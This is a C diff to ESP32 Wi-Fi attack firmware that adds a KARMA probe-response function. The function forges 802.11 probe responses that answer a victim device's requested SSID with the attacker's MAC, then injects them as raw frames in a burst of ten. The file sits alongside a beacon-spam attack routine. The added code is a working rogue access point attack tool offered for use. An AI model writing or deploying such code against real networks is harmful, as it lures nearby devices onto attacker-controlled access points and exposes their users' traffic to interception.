@@ -534,3 +534,35 @@ void wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
         vTaskDelay(pdMS_TO_TICKS(5));
     }
 }
+
+
+void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char *requested_ssid, uint8_t channel)
+{
+    uint8_t my_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, my_mac);
+
+    struct libwifi_probe_resp probe_resp_logic = {0};
+    int ret_create = libwifi_create_probe_resp(&probe_resp_logic, victim_mac, my_mac, my_mac, requested_ssid, channel);
+
+    if (ret_create != 0) {
+        ESP_LOGE("KARMA", "Errore creazione struct probe response");
+        return;
+    }
+
+    uint8_t buffer[512];
+    size_t frame_len = libwifi_dump_probe_resp(&probe_resp_logic, buffer, sizeof(buffer));
+    if (frame_len == 0) {
+        ESP_LOGE("KARMA", "Errore dump probe response");
+        libwifi_free_probe_resp(&probe_resp_logic);
+        return;
+    }
+    
+    /* Spam 10 packets */
+    for (uint8_t i = 0; i <= 9; i++) 
+    {
+        esp_wifi_80211_tx(WIFI_IF_AP, buffer, frame_len, false);
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+
+    libwifi_free_probe_resp(&probe_resp_logic);
+}
